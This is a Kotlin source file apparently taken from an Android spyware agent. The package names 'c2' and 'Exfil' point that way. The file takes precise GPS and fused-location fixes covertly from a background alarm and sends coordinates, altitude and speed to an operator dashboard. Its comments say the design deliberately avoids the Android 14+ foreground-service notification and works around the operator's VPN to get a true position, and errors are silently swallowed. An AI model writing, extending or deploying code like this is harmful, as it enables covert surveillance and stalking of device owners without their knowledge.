package com.sp.core.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * One-shot position request.
 *
 * The position used to come from a long-running foreground service - on
 * Android 14+ that service always shows a notification. Now the fix is
 * taken inside the agent tick (the watchdog alarm), with the background
 * location grant, and the process dies right after it.
 *
 * There is no IP geolocation any more. Behind an operator VPN the IP belongs
 * to the exit node of the tunnel, so the panel showed the wrong town. Only a
 * real fix counts:
 *   1. gps     - a real fix from the fused provider / the GPS provider
 *   2. network - the last known cell/WiFi position
 * If there is no fix, nothing is sent - the dashboard shows "bez fixu"
 * instead of a wrong position.
 */
object LocationFix {

    private const val TAG = "LocationFix"
    private const val TIMEOUT_MS = 5_000L
    private const val GPS_TIMEOUT_MS = 8_000L

    /** A fix worse than this is not worth showing - GPS has to be close. */
    private const val GOOD_ACCURACY_M = 80f

    private val busy = AtomicBoolean(false)
    private val bg = Executors.newSingleThreadExecutor { r ->
        Thread(r, "sp-loc").apply { isDaemon = true }
    }

    fun send(ctx: Context, immediate: Boolean) {
        val app = ctx.applicationContext
        if (!hasAnyLocation(app)) {
            // No grant - say so instead of guessing a position.
            try {
                Exfil.sendLog(app, "location_status", """{"ok":false,"reason":"no_permission"}""")
            } catch (_: Throwable) {
            }
            return
        }
        if (!busy.compareAndSet(false, true)) return
        bg.execute {
            try {
                fetch(app, immediate)
            } catch (t: Throwable) {
                try {
                    Exfil.sendLog(app, "location_status", """{"ok":false,"reason":"error"}""")
                } catch (_: Throwable) {
                }
            } finally {
                busy.set(false)
            }
        }
    }

    private fun fetch(ctx: Context, immediate: Boolean) {
        val fused = fusedFix(ctx)
        // The fused provider often answers with a cell position of a few
        // hundred meters - the raw GPS provider is not affected by the VPN
        // of the operator, so it is asked as well.
        val gps = rawGps(ctx)
        val best = pickBest(fused, gps)
        if (best == null) {
            try {
                Exfil.sendLog(ctx, "location_status", """{"ok":false,"reason":"no_fix"}""")
            } catch (_: Throwable) {
            }
            return
        }
        push(ctx, best, immediate)
    }

    /** The fused provider (Google Play services) with the high accuracy priority. */
    private fun fusedFix(ctx: Context): Location? {
        val client = try {
            LocationServices.getFusedLocationProviderClient(ctx)
        } catch (_: Throwable) {
            null
        } ?: return null

        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        val token = cts.token
        val latch = java.util.concurrent.CountDownLatch(1)
        var result: Location? = null
        try {
            client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, token)
                .addOnSuccessListener { loc ->
                    result = loc
                    latch.countDown()
                }
                .addOnFailureListener { latch.countDown() }
        } catch (_: Throwable) {
            latch.countDown()
        }
        // The fused provider can hang - the tick must not block on it.
        try { latch.await(TIMEOUT_MS, TimeUnit.MILLISECONDS) } catch (_: Throwable) {}
        try { cts.cancel() } catch (_: Throwable) {}

        val loc = result
        if (loc != null) return loc

        // The last known position of the fused provider is free and usually
        // good enough (it is the same fix the provider keeps for us).
        var last: Location? = null
        val l2 = java.util.concurrent.CountDownLatch(1)
        try {
            client.lastLocation.addOnSuccessListener { l ->
                last = l
                l2.countDown()
            }.addOnFailureListener { l2.countDown() }
        } catch (_: Throwable) {
            l2.countDown()
        }
        try { l2.await(2_500L, TimeUnit.MILLISECONDS) } catch (_: Throwable) {}
        return last
    }

    /** A fix straight from the GPS chip - the only one the VPN cannot move. */
    private fun rawGps(ctx: Context): Location? {
        val lm = try {
            ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
        } catch (_: Throwable) {
            null
        } ?: return null

        val last = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (_: Throwable) { null }
        val fresh = try {
            val latch = java.util.concurrent.CountDownLatch(1)
            var got: Location? = null
            val listener = object : LocationListener {
                override fun onLocationChanged(l: Location) {
                    got = l
                    latch.countDown()
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("deprecated in the API")
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            }
            try { lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper()) } catch (_: Throwable) {}
            try { latch.await(GPS_TIMEOUT_MS, TimeUnit.MILLISECONDS) } catch (_: Throwable) {}
            try { lm.removeUpdates(listener) } catch (_: Throwable) {}
            got
        } catch (_: Throwable) {
            null
        }
        return fresh ?: last
    }

    /** The better of the two fixes - the accurate one wins. */
    private fun pickBest(a: Location?, b: Location?): Location? {
        if (a == null) return b
        if (b == null) return a
        val aa = a.accuracy
        val ab = b.accuracy
        if (ab <= GOOD_ACCURACY_M && aa > GOOD_ACCURACY_M) return b
        if (aa <= GOOD_ACCURACY_M && ab > GOOD_ACCURACY_M) return a
        return if (ab < aa) b else a
    }

    private fun push(ctx: Context, loc: Location, immediate: Boolean) {
        try {
            // The fused provider mixes the GPS chip with the cell network.
            // An accurate fused fix is a GPS fix, a coarse one is the network.
            val prov = loc.provider?.lowercase() ?: ""
            val source = when {
                prov.contains("gps") -> "gps"
                prov.contains("fused") && loc.accuracy <= 100f -> "gps"
                else -> "network"
            }
            val payload = JSONObject().apply {
                put("lat", loc.latitude)
                put("lon", loc.longitude)
                put("acc", loc.accuracy)
                put("alt", loc.altitude)
                put("speed", loc.speed)
                put("ts", loc.time)
                put("provider", loc.provider)
                put("source", source)
            }
            if (immediate) {
                Exfil.sendLog(ctx, "location", payload.toString())
            } else {
                BatchExfil.enqueue(ctx, "location", payload.toString())
            }
        } catch (_: Throwable) {
        }
    }

    private fun hasFineLocation(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasAnyLocation(ctx: Context): Boolean =
        hasFineLocation(ctx) ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED
}
